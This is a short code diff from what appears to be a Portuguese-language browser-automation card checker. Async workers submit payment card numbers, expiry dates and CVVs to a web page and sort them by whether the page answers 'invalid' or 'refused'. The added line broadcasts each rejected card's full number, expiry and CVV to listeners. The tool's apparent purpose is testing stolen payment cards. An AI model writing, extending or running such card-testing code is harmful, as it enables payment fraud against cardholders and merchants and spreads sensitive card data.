@@ -170,6 +170,7 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_f
                             body = (await page.locator("body").inner_text()).lower()
                             if any(x in body for x in ["inválida", "recusado", "erro"]):
                                 log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
+                                await broadcast("reprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                                 break
                             await asyncio.sleep(1.5)
                     except Exception as e:
